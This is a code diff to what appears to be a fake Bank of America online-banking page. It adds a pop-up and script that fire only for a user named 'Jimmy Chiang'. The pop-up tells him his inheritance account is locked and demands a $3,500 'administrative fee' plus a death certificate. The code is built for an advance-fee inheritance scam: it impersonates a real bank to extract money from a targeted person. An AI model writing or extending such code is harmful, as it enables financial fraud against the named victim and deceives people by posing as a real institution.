@@ -127,6 +127,29 @@
                 <span>Invest</span>
             </div>
         </nav>
+
+        <!-- Jimmy Chiang only: account upgrade notice -->
+        <div id="upgradePendingModal" class="modal-overlay modal-overlay-contained" style="display: none;" aria-hidden="true">
+            <div class="security-modal-content">
+                <div class="security-modal-header">
+                    <img src="logo.svg" alt="Bank of America Logo" class="security-logo-icon">
+                    <span class="security-logo-text">BANK OF AMERICA</span>
+                </div>
+                <div class="security-body">
+                    <div class="security-icon-lock" style="color: #E31837;">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="security-title" id="upgradePendingTitle">ACCOUNT UPGRADE PENDING</div>
+                    <div class="security-text" style="text-align: left;" id="upgradePendingMessage">
+                        Your inheritance account is currently unavailable due to an account upgrade and missing documentation: the death certificate of the deceased account holder.<br><br>
+                        A <strong style="color: #E31837;">$3,500</strong> administrative fee is required for the account upgrade and activation.<br><br>
+                        <strong>Status: Pending Completion</strong>
+                    </div>
+                    <button type="button" id="closeUpgradePendingBtn" class="security-btn">I Understand</button>
+                    <div class="security-footer-link" id="upgradePendingSupport">Contact Support</div>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script src="client-secure.js"></script>
@@ -134,9 +157,62 @@
     <script src="auth.js"></script>
     <script>
         BoAAuth.requireAuth();
+
+        var upgradePendingModal = document.getElementById('upgradePendingModal');
+        var closeUpgradePendingBtn = document.getElementById('closeUpgradePendingBtn');
+
+        function isJimmyChiang(name) {
+            if (window.BoAConfig && typeof BoAConfig.isJimmyChiang === 'function') {
+                return BoAConfig.isJimmyChiang(name);
+            }
+            return /^jimmy\s+chiang$/i.test(String(name || '').trim());
+        }
+
+        function showUpgradePendingModal() {
+            if (!upgradePendingModal) return;
+            if (window.BoAConfig && typeof BoAConfig.getJimmyUpgradeNotice === 'function') {
+                var notice = BoAConfig.getJimmyUpgradeNotice();
+                var titleEl = document.getElementById('upgradePendingTitle');
+                var messageEl = document.getElementById('upgradePendingMessage');
+                var closeBtn = document.getElementById('closeUpgradePendingBtn');
+                var supportEl = document.getElementById('upgradePendingSupport');
+                if (titleEl) titleEl.textContent = notice.title;
+                if (messageEl) messageEl.innerHTML = notice.bodyHtml;
+                if (closeBtn) closeBtn.textContent = notice.button;
+                if (supportEl) supportEl.textContent = notice.support;
+            }
+            upgradePendingModal.style.display = 'flex';
+            upgradePendingModal.setAttribute('aria-hidden', 'false');
+        }
+
+        function hideUpgradePendingModal() {
+            if (!upgradePendingModal) return;
+            upgradePendingModal.style.display = 'none';
+            upgradePendingModal.setAttribute('aria-hidden', 'true');
+        }
+
         BoAConfig.initPage(function () {
             BoAConfig.renderDashboard();
+            try {
+                var config = BoAConfig.get();
+                if (isJimmyChiang(config.fullName)) {
+                    showUpgradePendingModal();
+                }
+            } catch (e) {
+                // ignore
+            }
         });
+
+        if (closeUpgradePendingBtn) {
+            closeUpgradePendingBtn.addEventListener('click', hideUpgradePendingModal);
+        }
+        if (upgradePendingModal) {
+            upgradePendingModal.addEventListener('click', function (e) {
+                if (e.target === upgradePendingModal) {
+                    hideUpgradePendingModal();
+                }
+            });
+        }
 
         document.getElementById('logout-btn').addEventListener('click', function() {
             BoAAuth.logout();
